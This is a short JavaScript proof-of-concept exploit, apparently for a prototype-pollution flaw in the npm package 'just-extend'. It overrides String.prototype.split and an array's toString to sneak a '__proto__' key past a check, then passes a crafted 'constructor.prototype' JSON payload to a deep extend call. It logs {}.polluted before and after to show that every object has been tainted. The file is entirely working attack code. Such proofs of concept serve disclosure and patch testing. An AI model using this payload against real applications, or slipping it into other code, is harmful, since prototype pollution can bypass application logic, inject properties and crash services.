var arg = ['__proto__'];
var flag1 = true;
arg.toString = function () {
    if (flag1) {
        flag1 = false;
        return 'foo';
    } else {
        return '__proto__';
    }
};
String.prototype.split = function () {
    return [
        arg,
        'polluted'
    ];
};
const extend = require('just-extend');
let obj = {};
console.log({}.polluted);
let payload2 = JSON.parse('{"constructor.prototype": {"polluted":"yes"}}');
extend(true, {}, payload2);
console.log({}.polluted);